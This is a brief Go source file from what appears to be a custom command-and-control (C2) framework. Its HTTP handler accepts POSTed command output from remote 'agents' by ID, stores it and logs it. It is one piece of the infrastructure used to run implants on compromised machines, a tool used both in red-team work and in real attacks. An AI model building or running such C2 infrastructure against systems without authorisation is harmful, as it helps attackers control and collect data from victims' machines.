package routes

import (
	"io"
	"log"
	"net/http"
	"strings"

	"customgoc2/data"
)

func HandleOutput(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	agentID := strings.TrimPrefix(r.URL.Path, "/output/")
	if agentID == "" {
		http.Error(w, "Agent ID missing", http.StatusBadRequest)
		return
	}

	body, err := io.ReadAll(r.Body)
	if err != nil {
		http.Error(w, "Failed to read body", http.StatusInternalServerError)
		return
	}

	data.Store.AddOutput(agentID, string(body))
	log.Printf("[+] Output from %s: %s\n", agentID, string(body))
	w.WriteHeader(http.StatusOK)
	w.Write([]byte("OK"))
}
